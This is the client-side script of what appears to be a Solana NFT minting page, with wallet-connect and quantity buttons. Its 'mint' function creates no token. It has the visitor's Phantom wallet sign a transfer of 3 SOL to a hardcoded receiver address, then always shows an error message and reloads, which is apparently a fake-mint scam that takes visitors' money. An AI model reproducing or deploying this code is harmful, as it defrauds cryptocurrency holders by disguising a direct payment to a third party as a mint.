    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
    <script>
        let solanaAmount = 3

        function plus() {
            var $input = $('.amountGoblinBrain')
            var count = parseInt($input.val()) + 1

            solanaAmount = parseFloat(document.getElementById('solanaAmount').innerHTML)
            if (count < 2) {
                document.getElementById('solanaAmount').innerHTML = (
                    solanaAmount + 3
                ).toFixed('2')
            }
            solanaAmount = parseFloat(document.getElementById('solanaAmount').innerHTML)

            //count = count >= 5 ? 5 : count;
            count = count >= 1 ? 1 : count
            $input.val(count)
            $input.change()
            return false
        }

        function minus() {
            var $input = $('.amountGoblinBrain')
            var count = parseInt($input.val()) - 1

            solanaAmount = parseFloat(document.getElementById('solanaAmount').innerHTML)
            if (count > 0) {
                document.getElementById('solanaAmount').innerHTML = (
                    solanaAmount - 3
                ).toFixed('2')
            }
            solanaAmount = parseFloat(document.getElementById('solanaAmount').innerHTML)

            count = count <= 1 ? 1 : count
            $input.val(count)
            $input.change()
            return false
        }

        function is_phantom_installed() {
            if (!(window.solana && window.solana.isPhantom)) {
                window.open("https://phantom.app/", "_blank");
            }
        }

        function phantom_connect() {
            is_phantom_installed();
            window.solana.connect();
            //window.solana.request({ method: "connect" })

            window.solana.on("connect", () => {
                $('#p_connected-to').removeClass('hidden')
                document.getElementById("public-key").innerHTML = window.solana.publicKey
                $('#connect_button').addClass('hidden')
                $('#mint_button').removeClass('hidden')
            })
        }

        async function phantom_mint() {
            const getProvider = async () => {
                if ("solana" in window) {
                    const provider = window.solana;
                    if (provider.isPhantom) {
                        //console.log("Is Phantom installed?  ", provider.isPhantom);
                        return provider;
                    }
                } else {
                    window.open("https://www.phantom.app/", "_blank");
                }
            };

            // Detecing and storing the phantom wallet of the user (creator in this case)
            var provider = await getProvider();

            solanaAmount = 3
            nftAmount = 1

            // https://solana-mainnet.phantom.tech
            // https://api.mainnet-beta.solana.com/

            var recieverWallet = new solanaWeb3.PublicKey('jPRjvytA2r8zAPqP1MV83NGbWpktyFJXsXcFQRmGRVR');
            const connection = new solanaWeb3.Connection('https://solana-mainnet.phantom.tech');
            var lamports = solanaWeb3.LAMPORTS_PER_SOL;
            lamports = (lamports * solanaAmount) * nftAmount;
            //console.log(lamports)
            var transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: provider.publicKey,
                    toPubkey: recieverWallet,
                    lamports: lamports //Investing 1 SOL. Remember 1 Lamport = 10^-9 SOL.
                }),
            );
            transaction.feePayer = await provider.publicKey;
            let blockhashObj = await connection.getRecentBlockhash();
            transaction.recentBlockhash = await blockhashObj.blockhash;
            const signedTransaction = await window.solana.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction.serialize());

            $('.mint_wrap-error_message').removeClass('hidden')

            setTimeout(function () {
                location.reload();
            }, 3000)
        }
    </script>
